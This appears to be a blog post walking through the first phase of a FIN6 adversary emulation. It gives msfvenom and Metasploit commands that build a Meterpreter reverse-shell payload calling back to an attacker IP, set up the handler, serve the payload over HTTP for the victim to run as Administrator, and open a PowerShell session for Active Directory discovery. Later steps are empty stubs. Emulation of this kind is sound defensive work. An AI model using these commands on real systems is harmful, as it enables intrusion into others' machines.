---
title: FIN6 Adversary Emulation - Phase 1
date: 2023-08-02 09:23:59 +0800
categories: [Adversary Emulation, FIN6]
tags: [threathunt,metasploit]
pin: true
math: true
mermaid: true
---

## FIN6 Overview

FIN6 is thought to be a financially motivated cyber-crime group. The group has aggressively targeted and compromised high-volume POS systems in the hospitality and retail sectors since at least 2015. FIN6 has targeted e-commerce sites and multinational organizations. Most of the group’s targets have been located in the United States and Europe, but include companies in Australia, Canada, Spain, India, Kazakhstan, Serbia, and China.

## Step 1 - Initial Access

### 1.1 - Phishing: Spearphishing Attachment [**T1566.001**](https://attack.mitre.org/techniques/T1566/001/) and via Service [**T1566.003**](https://attack.mitre.org/techniques/T1566/003/)

As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery. FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks. 

### 1.2 - C2 Framework

FIN6 has made use of CobaltStrike and Metasploit. For this demonstration, we'll create initial payload using Metasploit’s [**Msfvenom**](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).

_MsfVenom_ is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. The advantages of Msfvenom are:

One single tool
Standardized command line options
Increased speed

_MsfVenom_ has a wide range of options available:

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom.png){:width="100%"}


### 1.3 - Generate Initial Access Payload 

To generate a payload, there are two flags that you must supply (`-p` and `-f`):

- The `-p` flag: Specifies what payload to generate
- The `-f` flag: Specifies the format of the payload

To see what payloads are available from Framework, you can do:

```bash
./msfvenom -l payloads
```

Below is the typical syntax to use _MsfVenom_:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Attacker IP] lport=4444 -f exe -o /tmp/my_payload.exe
```

Take note that in order to dump credentials with Mimikatz later on the victim's Windows Server, we need to use the x64 version of Windows Meterpreter TCP reverse shell.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfVenom_Payload.png){:width="100%"}

### 1.4 - Generate Payload Handler

With our Windows X64 executable payload is now created, we need a handler to accept the connection back from our target. We will use the `exploit/multi/handler` metasploit module.

Normally, you can use exploit/multi/handler this way:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 
```

To check the current configuration of the exploit handler, we can use the command to list down the various options for this module:

```bash
msf6 exploit(multi/handler) > show options
```

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Show_Options.png){:width="100%"}

As youn can see, the payload is currently set to default `generic/shell_reverse_tcp`. We need to configure the payload and exploit appropriately, so the Meterpreter shell can connect back to our attackerVM machine. In this case, we need to inform the exploit handler for the type of the payload that we generated:

```bash
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
```

Aside from that, we can also see that LHOST needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.

We can set the LHOST option with the following command:

```bash
set LHOST [Attacker IP]
```

Once done, you should now have a similar configuration on the screenshot below.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Final_Show_Options.png){:width="100%"}


To start the handler, just execute the following command.

```bash
msf6 exploit(multi/handler) > exploit
```

### 1.4 - Tranfser the Payload via Server

Next, we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 

Open another terminal tab, then navigate to the folder location of the payload:

```bash
cd /tmp/
```

Start a Python3 HTTP server on port 80:

```bash
sudo python3 -m http.server 80
```

### 1.5 - Download Payload to Start the Communication on Exploit Handler

Switch to the victim's Server. Open a browser and navigate to to the attackerVM IP address to download the payload to the Desktop.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Download_MsfVenom_Payload.png){:width="100%"}

Once downloaded, execute the payload as Administrator. Since as parts of this emulation plan, the payload requires elevated access. 

Then switch back to the `msfconsole` terminal window on the attackerVM. You should see that the handler received a callback from the victim's Server, with a new meterpreter session created.

![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Established_MsfVenom_Payload.png){:width="100%"}

FIN6

## Step 2 - Discovery

After gaining access to the target network, FIN6 enumerates the network and Active Directory (AD) environment. The second objective is to conduct internal reconnaissance. The intent of Discovery is to identify opportunities for escalation, lateral movement, systems for staging, and systems of interest for the effects phase of the emulation. 

### 2.1 - Software: AdFind [**S0552**](https://attack.mitre.org/software/S0552/)

FIN6 is believed to have used ADFind for this purpose on at least one occasion. 

[**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a command line Active Directory query tool. Mixture of ldapsearch, search.vbs, ldp, dsquery, and dsget tools with a ton of other cool features thrown in for good measure. This tool proceeded dsquery/dsget/etc by years though I did adopt some of the useful stuff from those tools.

On the `meterpreter` terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:

```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

## Step 3 - Privilege Escalation

FIN6

## Step 4 - Collection and Exfiltration

FIN6

## References

<https://www.offsec.com/metasploit-unleashed/msfvenom/>
